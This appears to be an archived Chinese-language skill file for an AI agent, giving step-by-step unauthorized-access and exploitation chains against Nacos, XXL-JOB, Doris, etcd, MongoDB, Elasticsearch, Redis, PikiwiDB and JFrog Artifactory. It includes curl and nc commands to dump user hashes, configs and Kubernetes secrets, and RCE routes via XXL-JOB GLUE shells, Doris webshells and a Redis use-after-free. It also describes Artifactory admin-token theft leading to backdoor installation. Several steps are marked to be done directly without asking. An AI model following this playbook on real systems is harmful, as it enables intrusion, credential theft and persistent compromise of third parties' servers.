<!-- archived from /root/.hermes/skills/security/middleware-unauth-family/SKILL.md on 2026-10-21 -->

---
name: middleware-unauth-family
description: "中间件未授权渗透时使用。触发: Nacos, XXL-JOB, Doris, etcd, MongoDB。"
version: 1.0.0
license: MIT
author: hermes-curator
metadata:
  hermes:
    tags: [pentest, middleware, nacos, xxljob, doris, etcd, mongodb, redis, elasticsearch, memcached, surveyengine-absorbed]
    related_skills: [java-framework-deserialization-family, heapdump-credential-hunter, surveyengine-knowledge-pack]
---

> 归档卡：原目录 `/root/.hermes/skills/security/middleware-unauth-family`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/middleware-unauth-family/…')`，不要相对 `references/legacy/` 解析。

# 中间件未授权渗透家族 (Middleware Unauth Family)

## When to Use

遇到正文顶部触发指纹/关键词时使用本技能(吸收自测绘引擎知识包)。完整卡全文: 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<原名>\SKILL.md`。


来源: 测绘引擎知识包吸收。覆盖 Nacos 3.x / XXL-JOB / Doris / etcd / MongoDB / ES / Memcached / Redis 未授权与利用链。完整卡在镜像 `.cursor\skills\<name>\SKILL.md`。

## Nacos 3.x 鉴权作用域错配(3.0.0~3.2.3,修 3.2.4)
**原理**: UserV3/RoleV3/PermissionV3 控制器漏写 `apiType`,即使 `admin.enabled`/`console.enabled` 全开,`/nacos/v3/auth/*` 仍不鉴权。
```bash
# 无损探测: GET /nacos/v3/auth/user/list 无 token 返 200 + {"code":0,"data":{"pageItems":[...]}} = 阳性
# 完整链(默认自动清理): 建号→绑角色→发 *:* 权限→登录→列配置→写 marker
curl -s "http://<IP>:8848/nacos/v3/auth/user/list?pageNo=1&pageSize=100"   # 拖用户名+bcrypt hash
# 以 token 列配置
curl -s "http://<IP>:8848/nacos/v3/admin/cs/config/list?pageNo=1&pageSize=100" -H "accessToken: $TOKEN"
# 写 marker(禁止覆盖生产配置): POST /nacos/v3/admin/cs/config dataId=pentest-marker.txt ...
```
- **不要**: 绑定 ROLE_ADMIN(服务端拦截+告警)/覆盖删除生产配置/改 admin 密码
- 拿到配置 `ENC(...)` → Jasypt 解密 → spring-actuator 链;DB/Redis 凭据 → 回灌业务

## XXL-JOB 管理台(admin/123456)
```bash
# 四刀: 认口(/xxl-job-admin/ :8080 :9997; 执行器 :9999 /run) → 进后台 → 列执行器(jobgroup/pageList) → GLUE
# 登录成功看: XXL_JOB_LOGIN_IDENTITY cookie 或 302 /index 或 JSON code:200(三态都算,老模板只认 JSON 会漏)
# GLUE: jobinfo/add + glueType=GLUE_SHELL + trigger = RCE,授权内直接做
```
- 弱口令: `admin/123456` → `admin/admin` `xxljob/123456`
- L3 后不停在 id → 后渗透链(JAR→YML→JDBC→Redis→JWT→云凭据)

## Apache Doris / StarRocks 三板斧(StarRocks 同口当兄弟栈)
- 斧1: `9030` FE MySQL 协议 **root/admin 空口令** → `SHOW DATABASES`
- 斧2: `8030` HTTP 无鉴权或 Basic `root:` → Doris `/api/query`;StarRocks `/api/v1/catalogs/.../sql`;顺带 8040 BE
- 斧3: 应用 SQLi 或已有 SQL 面 → information_schema 摸业务表;**OUTFILE/甩马授权内直接做**
- `<3.1.0` FE 管理 REST 对上 **CVE-2026-58319**

## etcd(2379 客户端;2380 是 peer 别当业务口)
```bash
curl http://IP:2379/version | curl http://IP:2379/health    # L1 裸奔
curl "http://IP:2379/v2/keys/?recursive=true"                # v2 老集群全量
# v3 range / Watch(CVE-2026-73499 越权读) → 抽 kubernetes.io secret/DB串/云AK
```
- **禁止**复现 CVE-2026-73500 TLS 洪水;双 401 = 已开鉴权,换证书/SA,不要报未授权

## MongoDB / ES / Memcached / Redis
```bash
# MongoDB 27017: pymongo 连上不弹密码 = 未授权;优先集合 users/payment/orders/admin/operator
python3 -c "import pymongo; c=pymongo.MongoClient('<IP>',27017,serverSelectionTimeoutMS=5000); print(c.list_database_names())"
# Elasticsearch 9200: curl 返 cluster_name/version JSON; 401 + security_exception = 已开鉴权 ⇒ 去凭据面找 elastic 口令
# ★ 拿到 ES/Kibana 不是结案: 日志索引常是全量 request/response body(requestBody/responseBody/headers)
#   = 数据库镜像(明文口令/活 token/业务响应体)。接管与按字段锚定拖库 →
#   supply-chain-infra-hop/references/logstore-dump.md
# Memcached 11211: echo "stats" | nc <IP> 11211 → STAT pid
- Redis 6379: 读 captcha、主从写文件授权内直接做;flush_all/_delete/删索引先问

## PikiwiDB / Pika(v3.5.7,CVE-2026-84700,CVSS 8.6)— Redis 系兼容库隐藏复制口
- **关键指纹**: 内网/外网扫到 Redis 兼容端口(默认 9221,非 6379)时,`端口+2000` 常开内部 protobuf 复制服务(9221→11221),**不鉴权**即可连
- 原理: frame dispatcher(DealMessage)不要求先 MetaSync 成功就路由其他消息;requirepass 只在 HandleMetaSyncRequest 校验 → 未认证可发复制/数据面消息
- 探测: `nc <IP> 11221` 发 protobuf 帧;nuclei/手动指纹看 banner `Pika`
- 归属: PikiwiDB(Pika v3.x 是 360/OpenAtom 开源 Redis 替代,业务常当 Redis 用)→ 打到的复制面当 Redis 面打(读键/拖配置),授权内直接做
- 参考: vulncheck advisory / https://github.com/OpenAtomFoundation/pikiwidb/issues/3270
```
- FOFA 情报: MongoDB `port="27017"`;ES `port="9200" && title="elasticsearch"`;Memcached `port="11211"`

## JFrog Artifactory 未授权 → 管理员令牌 → Groovy 插件 RCE(2026-09 在野利用)
供应链制品库是当前最热在野目标之一(49%~62% 可达实例至少命中一个洞)。
- **CVE-2026-82329(CVSS 9.8,默认配置即可)**: JFrog Access 对未配置额外 join key 的实例发"phantom join key" → `POST /access/api/v1/registry/join` 直接返回 **admin 作用域令牌**,单洞直通管理员。CISA KEV 已收录。
  - 缓解(暂不能升级时): `system.yaml` 里加随机 join key,只接受自己的 key
- **链 CVE-2026-42018 + CVE-2026-42016**: `POST /access/api/v1/aws/token/`(**注意尾斜杠**)返回匿名 JWT → 拿去 `POST /access/api/v1/tokens` 换成 admin token(42016 = token scope 校验缺陷,低权 token 可换高权)。日志里显示 `token: <REDACTED> 却带管理员权限(天然防溯源)
- **后利用**: `/api/security/users/` 建持久管理员(<5 分钟)→ 装恶意 **Groovy 插件**(原生插件框架)= 服务端任意命令 → 落 Rust 后门,payload 下 `/dev/shm` `/tmp` `/var/tmp` → 拖 Artifactory 配置 + cluster join key + 仓库/token/用户枚举 → 加 SSH key
- **已修复版本**: 7.111.21 / 7.117.28 / 7.125.20 / 7.133.29 / 7.146.38 / 7.161.20 及以上
- **指纹**: `X-Artifactory-Id` 响应头、`title="Artifactory"`、`/artifactory/` UI、FOFA `app="JFrog-Artifactory"`
- 来源: https://www.bleepingcomputer.com/news/security/artifactory-flaws-chained-in-attacks-deploying-backdoor-malware/ | https://cybersecuritynews.com/jfrog-artifactory-vulnerabilities-actively-exploited/

## 纪律
- SSRF 打到的内网 IP **先扩权**再打
- 默认跑满 L2,不只扫端口结案;证据打码不拖全库
- 写完即清: Nacos 默认自动删账号;S3/写盘测完 DELETE

## 完整情报
镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\middleware-unauth\SKILL.md`(270行) + nacos/xxljob/doris/etcd 各专卡

## Redis 升级线：Vector Set（vset）重复 HNSW ID → UAF → RCE

前提：**已经能发命令**（未授权/弱口令/SSRF 到的）+ 目标带 `vset` 模块。
链：`RESTORE` → `VREM` → `VLINKS ... WITHSCORES`（上游 11 步：重复 HNSW ID → UAF → 64 位读 oracle → 覆写 `moduleValue->type` → `freeModuleObject()` → `system()`）。
判定：`MODULE LIST` / `COMMAND DOCS VLINKS` 先确认模块；不带模块退回写 SSH key / 计划任务 / 主从复制。
**这不是绕认证的手段，是拿到命令执行后的提权/落地线**。
`poc-db/exploitarium/redis-vset-duplicate-hnsw-id-rce-poc`
